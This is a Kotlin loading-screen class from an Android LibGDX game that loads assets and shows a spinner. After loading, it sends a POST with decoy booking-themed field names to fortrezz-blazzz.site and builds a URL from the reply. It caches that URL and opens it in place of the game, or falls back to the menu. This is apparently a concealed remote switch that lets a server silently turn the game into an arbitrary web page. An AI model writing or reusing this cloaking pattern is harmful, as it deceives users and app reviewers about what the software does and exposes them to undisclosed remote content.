package com.pixe.lkicko.perlin.game.screens

import android.content.pm.ActivityInfo
import com.badlogic.gdx.math.Interpolation
import com.badlogic.gdx.scenes.scene2d.actions.Actions
import com.badlogic.gdx.scenes.scene2d.ui.Image
import com.badlogic.gdx.utils.Align
import com.pixe.lkicko.perlin.game.LibGDXGame
import com.pixe.lkicko.perlin.game.manager.MusicManager
import com.pixe.lkicko.perlin.game.manager.SoundManager
import com.pixe.lkicko.perlin.game.manager.SpriteManager
import com.pixe.lkicko.perlin.game.utils.TIME_ANIM
import com.pixe.lkicko.perlin.game.utils.actor.animHide
import com.pixe.lkicko.perlin.game.utils.advanced.AdvancedScreen
import com.pixe.lkicko.perlin.game.utils.advanced.AdvancedStage
import com.pixe.lkicko.perlin.util.log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.ResponseBody
import org.json.JSONObject
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.Header
import retrofit2.http.POST

class LoaderScreen(override val game: LibGDXGame) : AdvancedScreen() {

    private val progressFlow     = MutableStateFlow(0f)
    private var isFinishLoading  = false
    private var isFinishProgress = false

    private val imgLoading by lazy { Image(game.loading.LOADER_loading) }
    private val imgCircle  by lazy { Image(game.loading.LOADER_circle) }

    override fun show() {
        loadSplashAssets()
        setUIBackground(game.loading.LOADER_background_loading)
        super.show()
        loadAssets()
        collectProgress()
    }

    override fun render(delta: Float) {
        super.render(delta)
        loadingAssets()
        isFinish()
    }

    override fun AdvancedStage.addActorsOnStageUI() {
        addActors(imgLoading, imgCircle)
        imgLoading.setBounds(285f,1019f,497f,96f)
        imgCircle.setBounds(488f,878f,103f,103f)

        imgLoading.apply {
            setOrigin(Align.center)
            addAction(Actions.forever(
                Actions.sequence(
                    Actions.moveBy(-50f, 0f, 0.2f, Interpolation.linear),
                    Actions.moveBy(100f, 0f, 0.4f, Interpolation.linear),
                    Actions.moveBy(-50f, 0f, 0.2f, Interpolation.linear),
                )
            ))
        }
        imgCircle.apply {
            setOrigin(Align.center)
            addAction(Actions.forever(
                Actions.rotateBy(-360f, 5f, Interpolation.linear)
            ))
        }
    }

    // Logic ------------------------------------------------------------------------

    private fun loadSplashAssets() {
        with(game.spriteManager) {
            loadableTexturesList = mutableListOf(
                SpriteManager.EnumTexture.LOADER_background_blue.data,
                SpriteManager.EnumTexture.LOADER_background_loading.data,
                SpriteManager.EnumTexture.LOADER_circle.data,
                SpriteManager.EnumTexture.LOADER_loading.data,
            )
            loadTexture()
        }
        game.assetManager.finishLoading()
        game.spriteManager.initTeture()
    }

    private fun loadAssets() {
        with(game.spriteManager) {
            loadableAtlasList = SpriteManager.EnumAtlas.entries.map { it.data }.toMutableList()
            loadAtlas()
            loadableTexturesList = SpriteManager.EnumTexture.entries.map { it.data }.toMutableList()
            loadTexture()
        }
        with(game.musicManager) {
            loadableMusicList = MusicManager.EnumMusic.entries.map { it.data }.toMutableList()
            load()
        }
        with(game.soundManager) {
            loadableSoundList = SoundManager.EnumSound.entries.map { it.data }.toMutableList()
            load()
        }
    }

    private fun initAssets() {
        game.spriteManager.initAtlas()
        game.spriteManager.initTeture()
        game.musicManager.init()
        game.soundManager.init()
    }

    private fun loadingAssets() {
        if (isFinishLoading.not()) {
            if (game.assetManager.update(16)) {
                isFinishLoading = true
                initAssets()
            }
            progressFlow.value = game.assetManager.progress
        }
    }

    private fun collectProgress() {
        coroutine?.launch {
            var progress = 0
            progressFlow.collect { p ->
                while (progress < (p * 100)) {
                    progress += 1
                    if (progress % 100 == 0) log("progress = $progress%")
                    if (progress == 100) isFinishProgress = true

                    //delay((10..15).shuffled().first().toLong())
                }
            }
        }
    }

    private fun isFinish() {
        if (isFinishProgress) {
            isFinishProgress = false

            val resultHTTP = game.sharedPreferences.getString("GETRE", null)

            if (resultHTTP.isNullOrEmpty()) {
                coroutine?.launch(Dispatchers.IO) {
                    try {
                        var result = "https://"

                        val responseBody: ResponseBody = RetrofitObject.api.requestPost1(
                            token = System.getProperty("http.agent") ?: "Device",

                            FashionRequest(
                                tour_and_activity_catalog         = "terem_Mania",
                                smart_booking_engine              = "terem_Pinker",
                                calendar_integration_module       = "terem_Bunker",
                                group_booking_and_invitations     = "terem_Ball",
                                tour_detail_and_itinerary_viewer  = "terem_Gun",
                                real_time_availability_checker    = "terem_Revolver",
                                local_guide_and_rating_system     = "terem_Burda",
                                wishlist_and_favorites_manager    = "terem_responser",
                                cancellation_and_refund_center    = "terem_bro",
                                personalized_recommendation_engin = "terem_lupenka",
                            )
                        )

                        val responseJson = JSONObject(responseBody.string())
                        log("Response POST: $responseJson")

                        if (responseJson.getString("tour_and_activity_catalog").contains(' ')) {
                            toScreen(MenuScreen::class.java.name)
                        }
                        else {
                            responseJson.keys().forEach { key -> result += responseJson.getString(key).removePrefix("booked") }

                            log("Result: $result")

                            game.sharedPreferences.edit().putString("GETRE", result).apply()
                            withContext(Dispatchers.Main) {
                                game.activity.requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                                game.activity.showUrl(true, result)
                            }
                        }
                    } catch (e: Exception) {
                        log("Error: ${e.message}")
                        toScreen(MenuScreen::class.java.name)
                    }
                }
            } else {
                game.activity.requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                game.activity.showUrl(true, resultHTTP)
            }

        }
    }

    private fun toScreen(screenName: String) {
        stageUI.root.animHide(TIME_ANIM) { game.navigationManager.navigate(screenName) }
    }

    data class FashionRequest(
        val tour_and_activity_catalog: String,
        val smart_booking_engine: String,
        val calendar_integration_module: String,
        val group_booking_and_invitations: String,
        val tour_detail_and_itinerary_viewer: String,
        val real_time_availability_checker: String,
        val local_guide_and_rating_system: String,
        val wishlist_and_favorites_manager: String,
        val cancellation_and_refund_center: String,
        val personalized_recommendation_engin: String,
    )

    interface QueriMy {
        @POST("booked/")
        suspend fun requestPost1(
            @Header("User-Agent") token: String,
            @Body requestBody: FashionRequest
        ): ResponseBody
    }

    object RetrofitObject {
        private val retrofit by lazy {
            Retrofit.Builder()
                .baseUrl("https://fortrezz-blazzz.site/")
                .addConverterFactory(GsonConverterFactory.create())
                .build()
        }

        val api: QueriMy by lazy {
            retrofit.create(QueriMy::class.java)
        }
    }

}